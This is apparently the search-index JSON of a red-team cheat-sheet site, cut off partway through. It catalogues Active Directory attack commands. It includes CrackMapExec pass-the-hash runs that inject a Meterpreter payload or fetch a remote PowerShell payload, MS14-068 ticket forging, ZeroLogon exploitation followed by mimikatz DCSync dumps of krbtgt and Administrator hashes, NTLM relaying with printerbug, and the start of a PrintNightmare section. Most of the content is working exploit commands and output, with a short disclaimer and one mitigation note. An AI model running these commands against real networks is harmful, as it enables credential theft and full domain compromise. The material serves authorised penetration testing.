{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hack The Planet","text":"<p>Curated list of commands &amp; methodologies to assist in Bug Bounty, Penetration Testing, &amp; Red Teaming.</p> <p> </p>"},{"location":"#documentation","title":"\ud83d\udcd6 Documentation","text":"<ul> <li>Disclaimer: Please use these tools &amp; methods responsibility, ONLY against systems you have explicit approval to test.</li> <li>Huge inspiration for this mkdocs repository came from https://github.com/swisskyrepo; credit to them!</li> </ul>"},{"location":"active-directory/active-directory-attacks/","title":"Active Directory Attacks","text":""},{"location":"active-directory/active-directory-attacks/#summary","title":"Summary","text":"<ul> <li>Active Directory Attacks</li> <li>Summary</li> <li>Tools</li> <li>Kerberos Clock Synchronization</li> <li>Active Directory Recon<ul> <li>Using BloodHound</li> <li>Using PowerView</li> <li>Using AD Module</li> </ul> </li> <li>From CVE to SYSTEM shell on DC<ul> <li>MS14-068 Checksum Validation</li> <li>ZeroLogon</li> <li>PrintNightmare</li> <li>samAccountName spoofing</li> </ul> </li> <li>Open Shares</li> <li>SCF and URL file attack against writeable share<ul> <li>SCF Files</li> <li>URL Files</li> <li>Windows Library Files</li> <li>Windows Search Connectors Files</li> </ul> </li> <li>Passwords in SYSVOL &amp; Group Policy Preferences</li> <li>Exploit Group Policy Objects GPO<ul> <li>Find vulnerable GPO</li> <li>Abuse GPO with SharpGPOAbuse</li> <li>Abuse GPO with PowerGPOAbuse</li> <li>Abuse GPO with pyGPOAbuse</li> <li>Abuse GPO with PowerView</li> <li>Abuse GPO with StandIn</li> </ul> </li> <li>Dumping AD Domain Credentials<ul> <li>DCSync Attack</li> <li>Volume Shadow Copy</li> <li>Extract hashes from ntds.dit</li> <li>Using Mimikatz sekurlsa</li> <li>Crack NTLM hashes with hashcat</li> <li>NTDS Reversible Encryption</li> </ul> </li> <li>User Hunting</li> <li>Password spraying<ul> <li>Kerberos pre-auth bruteforcing</li> <li>Spray a pre-generated passwords list</li> <li>Spray passwords against the RDP service</li> <li>BadPwdCount attribute</li> </ul> </li> <li>Password in AD User comment</li> <li>Password of Pre-Created Computer Account</li> <li>Reading LAPS Password</li> <li>Reading GMSA Password</li> <li>Forging Golden GMSA</li> <li>Kerberos Tickets<ul> <li>Dump Kerberos Tickets</li> <li>Replay Kerberos Tickets</li> <li>Convert Kerberos Tickets</li> <li>Pass-the-Ticket Golden Tickets</li> <li>Using Mimikatz</li> <li>Using Meterpreter</li> <li>Using a ticket on Linux</li> <li>Pass-the-Ticket Silver Tickets</li> <li>Pass-the-Ticket Diamond Tickets</li> <li>Pass-the-Ticket Sapphire Tickets</li> </ul> </li> <li>Kerberoasting</li> <li>KRB_AS_REP Roasting</li> <li>Kerberoasting w/o domain account</li> <li>CVE-2022-33679</li> <li>Timeroasting</li> <li>Pass-the-Hash</li> <li>OverPass-the-Hash (pass the key)<ul> <li>Using impacket</li> <li>Using Rubeus</li> </ul> </li> <li>Capturing and cracking Net-NTLMv1/NTLMv1 hashes</li> <li>Capturing and cracking Net-NTLMv2/NTLMv2 hashes</li> <li>Man-in-the-Middle attacks &amp; relaying<ul> <li>MS08-068 NTLM reflection</li> <li>LDAP signing not required and LDAP channel binding disabled</li> <li>SMB Signing Disabled and IPv4</li> <li>SMB Signing Disabled and IPv6</li> <li>Drop the MIC</li> <li>Ghost Potato - CVE-2019-1384</li> <li>RemotePotato0 DCOM DCE RPC relay</li> <li>DNS Poisonning - Relay delegation with mitm6</li> <li>Relaying with WebDav Trick</li> </ul> </li> <li>Active Directory Certificate Services<ul> <li>ESC1 - Misconfigured Certificate Templates</li> <li>ESC2 - Misconfigured Certificate Templates</li> <li>ESC3 - Misconfigured Enrollment Agent Templates</li> <li>ESC4 - Access Control Vulnerabilities</li> <li>ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 </li> <li>ESC7 - Vulnerable Certificate Authority Access Control</li> <li>ESC8 - AD CS Relay Attack</li> <li>ESC9 - No Security Extension</li> <li>ESC11 - Relaying NTLM to ICPR</li> <li>Certifried CVE-2022-26923</li> <li>Pass-The-Certificate</li> </ul> </li> <li>UnPAC The Hash</li> <li>Shadow Credentials</li> <li>Active Directory Groups<ul> <li>Dangerous Built-in Groups Usage</li> <li>Abusing DNS Admins Group</li> <li>Abusing Schema Admins Group</li> <li>Abusing Backup Operators Group</li> </ul> </li> <li>Active Directory Federation Services<ul> <li>ADFS - Golden SAML</li> </ul> </li> <li>Active Directory Integrated DNS</li> <li>Abusing Active Directory ACLs/ACEs<ul> <li>GenericAll</li> <li>GenericWrite</li> <li>GenericWrite and Remote Connection Manager</li> <li>WriteDACL</li> <li>WriteOwner</li> <li>ReadLAPSPassword</li> <li>ReadGMSAPassword</li> <li>ForceChangePassword</li> </ul> </li> <li>DCOM Exploitation<ul> <li>DCOM via MMC Application Class </li> <li>DCOM via Excel</li> <li>DCOM via ShellExecute</li> </ul> </li> <li>Trust relationship between domains</li> <li>Child Domain to Forest Compromise - SID Hijacking</li> <li>Forest to Forest Compromise - Trust Ticket</li> <li>Privileged Access Management (PAM) Trust</li> <li>Kerberos Unconstrained Delegation<ul> <li>SpoolService Abuse with Unconstrained Delegation</li> <li>MS-EFSRPC Abuse with Unconstrained Delegation</li> </ul> </li> <li>Kerberos Constrained Delegation</li> <li>Kerberos Resource Based Constrained Delegation</li> <li>Kerberos Service for User Extension<ul> <li>S4U2self - Privilege Escalation</li> </ul> </li> <li>Kerberos Bronze Bit Attack - CVE-2020-17049</li> <li>PrivExchange attack</li> <li>SCCM Deployment</li> <li>SCCM Network Access Accounts</li> <li>SCCM Shares</li> <li>WSUS Deployment</li> <li>RODC - Read Only Domain Controller<ul> <li>RODC Golden Ticket</li> <li>RODC Key List Attack</li> <li>RODC Computer Object</li> </ul> </li> <li>PXE Boot image attack</li> <li>DSRM Credentials</li> <li>DNS Reconnaissance</li> <li>Linux Active Directory<ul> <li>CCACHE ticket reuse from /tmp</li> <li>CCACHE ticket reuse from keyring</li> <li>CCACHE ticket reuse from SSSD KCM</li> <li>CCACHE ticket reuse from keytab</li> <li>Extract accounts from /etc/krb5.keytab</li> <li>Extract accounts from /etc/sssd/sssd.conf</li> </ul> </li> <li>References</li> </ul>"},{"location":"active-directory/active-directory-attacks/#tools","title":"Tools","text":"<ul> <li>Impacket or the Windows version</li> <li>Responder</li> <li>InveighZero</li> <li>Mimikatz</li> <li>Ranger</li> <li>AdExplorer</li> <li>CrackMapExec</li> </ul> <pre><code># use the latest release, CME is now a binary packaged will all its dependencies\nroot@payload$ wget https://github.com/mpgn/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip\n# execute cme (smb, winrm, mssql, ...)\nroot@payload$ cme smb -L\nroot@payload$ cme smb -M name_module -o VAR=DATA\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -M web_delivery -o URL=\"https://IP:PORT/posh-payload\"\nroot@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method smbexec -X 'whoami'\nroot@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz\nroot@payload$ cme mimikatz --server http --server-port 80\n</code></pre> <ul> <li>Mitm6</li> </ul> <pre><code>git clone https://github.com/fox-it/mitm6.git &amp;&amp; cd mitm6\npip install .\nmitm6 -d lab.local\nntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i\n# -wh: Server hosting WPAD file (Attacker\u2019s IP)\n# -t: Target (You cannot relay credentials to the same device that you\u2019re spoofing)\n# -i: open an interactive shell\nntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access\n</code></pre> <ul> <li>ADRecon</li> </ul> <pre><code>.\\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\\myuser\n</code></pre> <ul> <li> <p>Active Directory Assessment and Privilege Escalation Script</p> <pre><code>powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 \n</code></pre> </li> <li> <p>Ping Castle</p> <pre><code>pingcastle.exe --healthcheck --server &lt;DOMAIN_CONTROLLER_IP&gt; --user &lt;USERNAME&gt; --password &lt;PASSWORD&gt; --advanced-live --nullsession\npingcastle.exe --healthcheck --server domain.local\npingcastle.exe --graph --server domain.local\npingcastle.exe --scanner scanner_name --server domain.local\navailable scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users\n</code></pre> </li> <li> <p>Kerbrute</p> <pre><code>./kerbrute passwordspray -d &lt;DOMAIN&gt; &lt;USERS.TXT&gt; &lt;PASSWORD&gt;\n</code></pre> </li> <li> <p>Rubeus</p> <pre><code>Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]\nRubeus.exe dump [/service:SERVICE] [/luid:LOGINID]\nRubeus.exe klist [/luid:LOGINID]\nRubeus.exe kerberoast [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"]\n</code></pre> </li> <li> <p>AutomatedLab <pre><code>New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV\nAdd-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'\nInstall-Lab\nShow-LabDeploymentSummary\n</code></pre></p> </li> </ul>"},{"location":"active-directory/active-directory-attacks/#kerberos-clock-synchronization","title":"Kerberos Clock Synchronization","text":"<p>In Kerberos, time is used to ensure that tickets are valid. To achieve this, the clocks of all Kerberos clients and servers in a realm must be synchronized to within a certain tolerance. The default clock skew tolerance in Kerberos is <code>5 minutes</code>, which means that the difference in time between the clocks of any two Kerberos entities should be no more than 5 minutes.</p> <ul> <li>Detect clock skew automatically with <code>nmap</code> <pre><code>$ nmap -sV -sC 10.10.10.10\nclock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s\n</code></pre></li> <li>Compute yourself the difference between the clocks   <pre><code>nmap -sT 10.10.10.10 -p445 --script smb2-time -vv\n</code></pre></li> <li>Fix #1: Modify your clock   <pre><code>sudo date -s \"14 APR 2015 18:25:16\" # Linux\nnet time /domain /set # Windows\n</code></pre></li> <li>Fix #2: Fake your clock   <pre><code>faketime -f '+8h' date\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#active-directory-recon","title":"Active Directory Recon","text":""},{"location":"active-directory/active-directory-attacks/#using-bloodhound","title":"Using BloodHound","text":"<p>Use the correct collector * AzureHound for Azure Active Directory * SharpHound for local Active Directory * RustHound for local Active Directory</p> <ul> <li> <p>use BloodHoundAD/AzureHound (more info: Cloud - Azure Pentest)</p> </li> <li> <p>use BloodHoundAD/BloodHound <pre><code># run the collector on the machine using SharpHound.exe\n# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe\n# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe\n.\\SharpHound.exe -c all -d active.htb --searchforest\n.\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default\n.\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy)\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domaincontroller 10.10.10.100 -d active.htb\n.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23\n# or run the collector on the machine using Powershell\n# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1\n# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1\nInvoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public\nInvoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;\n# or remotely via BloodHound Python\n# https://github.com/fox-it/BloodHound.py\npip install bloodhound\nbloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all\n\n# or locally/remotely from an ADExplorer snapshot from SysInternals (ADExplorer remains a legitimate binary signed by Microsoft, avoiding detection with security solutions)\n# https://github.com/c3c/ADExplorerSnapshot.py\npip3 install --user .\nADExplorerSnapshot.py &lt;snapshot path&gt; -o &lt;*.json output folder path&gt;\n</code></pre></p> </li> <li>Collect more data for certificates exploitation using Certipy   <pre><code>certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound\ncertipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound\ncertipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123\n</code></pre></li> <li>use OPENCYBER-FR/RustHound <pre><code># Windows with GSSAPI session\nrusthound.exe -d domain.local --ldapfqdn domain\n# Windows/Linux simple bind connection username:password\nrusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z\n# Linux with username:password and ADCS module for @ly4k BloodHound version\nrusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z\n</code></pre></li> </ul> <p>Then import the zip/json files into the Neo4J database and query them.</p> <pre><code>root@payload$ apt install bloodhound \n# start BloodHound and the database\nroot@payload$ neo4j console\n# or use docker\nroot@payload$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/bloodhound -v $(pwd)/neo4j:/data neo4j:4.4-community\nroot@payload$ ./bloodhound --no-sandbox\nGo to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j\n</code></pre> <p>You can add some custom queries like : * Bloodhound-Custom-Queries from @hausec * BloodHoundQueries from CompassSecurity * BloodHound Custom Queries from Exegol - @ShutdownRepo * Certipy BloodHound Custom Queries from ly4k</p> <p>Replace the customqueries.json file located at <code>/home/username/.config/bloodhound/customqueries.json</code> or <code>C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json</code>.</p>"},{"location":"active-directory/active-directory-attacks/#using-powerview","title":"Using PowerView","text":"<ul> <li>Get Current Domain: <code>Get-NetDomain</code></li> <li>Enum Other Domains: <code>Get-NetDomain -Domain &lt;DomainName&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Policy: <pre><code>Get-DomainPolicy\n#Will show us the policy configurations of the Domain about system access or kerberos\n(Get-DomainPolicy).\"system access\"\n(Get-DomainPolicy).\"kerberos policy\"\n</code></pre></li> <li>Get Domain Controlers: <pre><code>Get-NetDomainController\nGet-NetDomainController -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enumerate Domain Users: <pre><code>Get-NetUser\nGet-NetUser -SamAccountName &lt;user&gt; \nGet-NetUser | select cn\nGet-UserProperty\n#Check last password change\nGet-UserProperty -Properties pwdlastset\n#Get a specific \"string\" on a user's attribute\nFind-UserField -SearchField Description -SearchTerm \"wtver\"\n\n#Enumerate user logged on a machine\nGet-NetLoggedon -ComputerName &lt;ComputerName&gt;\n\n#Enumerate Session Information for a machine\nGet-NetSession -ComputerName &lt;ComputerName&gt;\n\n#Enumerate domain machines of the current/specified domain where specific users are logged into\nFind-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName\n</code></pre></li> <li>Enum Domain Computers: <pre><code>Get-NetComputer -FullData\nGet-DomainGroup\n#Enumerate Live machines \nGet-NetComputer -Ping\n</code></pre></li> <li>Enum Groups and Group Members: <pre><code>Get-NetGroupMember -GroupName \"&lt;GroupName&gt;\" -Domain &lt;DomainName&gt;\n\n#Enumerate the members of a specified group of the domain\nGet-DomainGroup -Identity &lt;GroupName&gt; | Select-Object -ExpandProperty Member\n\n#Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences\nGet-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName\n</code></pre></li> <li>Enumerate Shares <pre><code>#Enumerate Domain Shares\nFind-DomainShare\n\n#Enumerate Domain Shares the current user has access\nFind-DomainShare -CheckShareAccess\n</code></pre></li> <li>Enum Group Policies: <pre><code>Get-NetGPO\n# Shows active Policy on specified machine\nGet-NetGPO -ComputerName &lt;Name of the PC&gt;\nGet-NetGPOGroup\n#Get users that are part of a Machine's local Admin group\nFind-GPOComputerAdmin -ComputerName &lt;ComputerName&gt;\n</code></pre></li> <li>Enum OUs: <pre><code>Get-NetOU -FullData \nGet-NetGPO -GPOname &lt;The GUID of the GPO&gt;\n</code></pre></li> <li>Enum ACLs: <pre><code># Returns the ACLs associated with the specified account\nGet-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs\nGet-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose\n#Search for interesting ACEs\nInvoke-ACLScanner -ResolveGUIDs\n#Check the ACLs associated with a specified path (e.g smb share)\nGet-PathAcl -Path \"\\\\Path\\Of\\A\\Share\"\n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-NetDomainTrust\nGet-NetDomainTrust -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust: <pre><code>Get-NetForestDomain\nGet-NetForestDomain Forest &lt;ForestName&gt;\n#Domains of Forest Enumeration\nGet-NetForestDomain\nGet-NetForestDomain Forest &lt;ForestName&gt;\n#Map the Trust of the Forest\nGet-NetForestTrust\nGet-NetDomainTrust -Forest &lt;ForestName&gt;\n</code></pre></li> <li>User Hunting: <pre><code>#Finds all machines on the current domain where the current user has local admin access\nFind-LocalAdminAccess -Verbose\n#Find local admins on all machines of the domain:\nInvoke-EnumerateLocalAdmin -Verbose\n#Find computers were a Domain Admin OR a specified user has a session\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\nInvoke-UserHunter -Stealth\n#Confirming admin access:\nInvoke-UserHunter -CheckAccess\n</code></pre>   :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: \\   I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt;    Profit!</li> </ul> <p>PowerView 3.0 Tricks</p>"},{"location":"active-directory/active-directory-attacks/#using-ad-module","title":"Using AD Module","text":"<ul> <li>Get Current Domain: <code>Get-ADDomain</code></li> <li>Enum Other Domains: <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Controlers: </li> </ul> <pre><code>Get-ADDomainController\nGet-ADDomainController -Identity &lt;DomainName&gt;\n</code></pre> <ul> <li>Enumerate Domain Users: <pre><code>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *\n#Get a specific \"string\" on a user's attribute\nGet-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description\n</code></pre></li> <li>Enum Domain Computers: <pre><code>Get-ADComputer -Filter * -Properties *\nGet-ADGroup -Filter * \n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-ADTrust -Filter *\nGet-ADTrust -Identity &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust: <pre><code>Get-ADForest\nGet-ADForest -Identity &lt;ForestName&gt;\n#Domains of Forest Enumeration\n(Get-ADForest).Domains\n</code></pre></li> <li>Enum Local AppLocker Effective Policy: <pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#other-interesting-commands","title":"Other Interesting Commands","text":"<ul> <li>Find Domain Controllers <pre><code>nslookup domain.com\nnslookup -type=srv _ldap._tcp.dc._msdcs.&lt;domain&gt;.com\nnltest /dclist:domain.com\nGet-ADDomainController -filter * | Select-Object name\ngpresult /r\n$Env:LOGONSERVER \necho %LOGONSERVER%\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#from-cve-to-system-shell-on-dc","title":"From CVE to SYSTEM shell on DC","text":"<p>Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a \"normal user\" shell on the DC you can also try to elevate your privileges using one of the methods listed in Windows - Privilege Escalation</p>"},{"location":"active-directory/active-directory-attacks/#ms14-068-checksum-validation","title":"MS14-068 Checksum Validation","text":"<p>This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p> <ul> <li>RPCClient   <pre><code>rpcclient $&gt; lookupnames john.smith\njohn.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)\n</code></pre></li> <li>WMI   <pre><code>wmic useraccount get name,sid\nAdministrator  S-1-5-21-3415849876-833628785-5197346142-500   \nGuest          S-1-5-21-3415849876-833628785-5197346142-501   \nAdministrator  S-1-5-21-297520375-2634728305-5197346142-500   \nGuest          S-1-5-21-297520375-2634728305-5197346142-501   \nkrbtgt         S-1-5-21-297520375-2634728305-5197346142-502   \nlambda         S-1-5-21-297520375-2634728305-5197346142-1110 \n</code></pre></li> <li>Powerview   <pre><code>Convert-NameToSid high-sec-corp.localkrbtgt\nS-1-5-21-2941561648-383941485-1389968811-502\n</code></pre></li> <li>CrackMapExec: <code>crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid</code> </li> </ul> <pre><code>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068\n</code></pre> <p>Generate a ticket with <code>metasploit</code> or <code>pykek</code></p> <pre><code>Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum\n   Name      Current Setting                                Required  Description\n   ----      ---------------                                --------  -----------\n   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL\n   PASSWORD  P@ssw0rd                                       yes       The Domain User password\n   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier\n   RPORT     88                                             yes       The target port\n   Timeout   10                                             yes       The TCP timeout to establish connection and read data\n   USER      lambda                                         yes       The Domain User\n   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000\n</code></pre> <pre><code># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek\n$ git clone https://github.com/SecWiki/windows-kernel-exploits\n$ python ./ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;\n$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org\n$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10\n$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066\n-1105\n  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!\n  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!\n  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!\n</code></pre> <p>Then use <code>mimikatz</code> to load the ticket.</p> <pre><code>mimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\"\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#mitigations","title":"Mitigations","text":"<ul> <li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li> </ul>"},{"location":"active-directory/active-directory-attacks/#zerologon","title":"ZeroLogon","text":"<p>CVE-2020-1472 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055</p> <p>Exploit steps from the white paper</p> <ol> <li>Spoofing the client credential</li> <li>Disabling signing and sealing</li> <li>Spoofing a call</li> <li>Changing a computer's AD password to null</li> <li>From password change to domain admin</li> <li> <p> reset the computer's AD password in a proper way to avoid any Deny of Service</p> </li> <li> <p><code>cve-2020-1472-exploit.py</code> - Python script from dirkjanm <pre><code>  # Check (https://github.com/SecuraBV/CVE-2020-1472)\n  proxychains python3 zerologon_tester.py DC01 172.16.1.5\n\n$ git clone https://github.com/dirkjanm/CVE-2020-1472.git\n# Activate a virtual env to install impacket\n$ python3 -m venv venv\n$ source venv/bin/activate\n$ pip3 install .\n\n# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)\nproxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5\n# Find the old NT hash of the DC\nproxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'\n# Restore password from secretsdump \n# secretsdump will automatically dump the plaintext machine password (hex encoded) \n# when dumping the local registry secrets on the newest version\npython restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3\ndeactivate\n</code></pre></p> </li> <li> <p><code>nccfsas</code> - .NET binary for Cobalt Strike's execute-assembly   <pre><code>git clone https://github.com/nccgroup/nccfsas\n# Check\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local\n# Resetting the machine account password\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset\n# Testing from a non Domain-joined machine\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch\n# Now reset the password back\n</code></pre></p> </li> <li> <p><code>Mimikatz</code> - 2.2.0 20200917 Post-Zerologon   <pre><code>privilege::debug\n# Check for the CVE\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$\n# Exploit the CVE and set the computer account's password to \"\"\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit\n# Execute dcsync to extract some hashes\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\n# Pass The Hash with the extracted Domain Admin hash\nsekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN\n# Use IP address instead of FQDN to force NTLM with Windows APIs \n# Reset password to Waza1234/Waza1234/Waza1234/\n# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584\nlsadump::postzerologon /target:10.10.10.10 /account:DC01$\n</code></pre></p> </li> <li> <p><code>CrackMapExec</code> - only check   <pre><code>crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon\n</code></pre></p> </li> </ol> <p>A 2nd approach to exploit zerologon is done by relaying authentication.</p> <p>This technique, found by dirkjanm, requires more prerequisites but has the advantage of having no impact on service continuity. The following prerequisites are needed: * A domain account * One DC running the <code>PrintSpooler</code> service * Another DC vulnerable to zerologon</p> <ul> <li><code>ntlmrelayx</code> - from Impacket and any tool such as <code>printerbug.py</code> <pre><code># Check if one DC is running the PrintSpooler service\nrpcdump.py 10.10.10.10 | grep -A 6 \"spoolsv\"\n\n# Setup ntlmrelay in one shell\nntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support\n\n#Trigger printerbug in 2nd shell\npython3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#printnightmare","title":"PrintNightmare","text":"<p>CVE-2021-1675 / CVE-2021-34527 The DLL will be stored in <code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\</code>. The exploit will execute the DLL either from the local filesystem or a remote share.</p> <p>Requirements: * Spooler Service enabled (Mandatory) * Server with patches &lt; June 2021 * DC with <code>Pre Windows 2000 Compatibility</code> group * Server with registry key <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall</code> = (DWORD) 1 * Server with registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA</code> = (DWORD) 0</p> <p>Detect the vulnerability: * Impacket - rpcdump <pre><code>python3 ./rpcdump.py @10.0.2.10 | 